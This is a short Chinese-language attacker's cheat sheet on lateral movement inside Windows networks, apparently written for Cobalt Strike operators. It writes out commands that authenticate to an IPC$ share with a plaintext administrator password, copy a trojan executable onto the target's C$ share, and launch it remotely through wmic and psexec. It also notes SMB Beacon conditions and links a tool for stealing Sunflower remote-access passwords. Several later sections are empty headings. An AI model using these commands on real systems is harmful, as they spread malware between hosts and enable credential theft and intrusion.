## 0x00 碰见的横向移动方法总结1_IPC（部分，慢慢更新）

    主机开启139和445端口，IPC移动  
    shell net use \\192.168.10.23\ipc$ "Psft24680!!@@62##" /user:"Administrator"  
    
    在本地传个马，copy过去    
    shell copy C:\\Windows\\Temp\\ma.exe \\192.168.10.23\c$\Windows\Temp\ma.exe
      
    wmic远程执行 
    shell wmic /node:192.168.10.23 /user:Administrator /password:Psft24680!!@@62## process call create "cmd.exe /c C:\\Windows\\Temp\\ma.exe"
    
    也可以使用psexec进行远程执行
    
    psexec.exe -accepteula \\192.168.41.150 -h -d c:\wanli.exe
    
    如果发现很久没有上线，可能目标不出网
 ## 0x01 横向移动方法总结2_beacon
 
    SMB Beacon使用命名管道和父级命名管道进行通信,所以利用他可进行横向移动
    
    使用条件
    
    使用SMB的主机必修接受445端口打开
    只能链接由同一Cobalt Strike实例管理的Beacon
## 0x02 横向移动方法3_PTH攻击

## 0x03 横向移动方法4_票据攻击

## 0x04 横向移动方法5_远控攻击

  https://github.com/wafinfo/Sunflower_get_Password


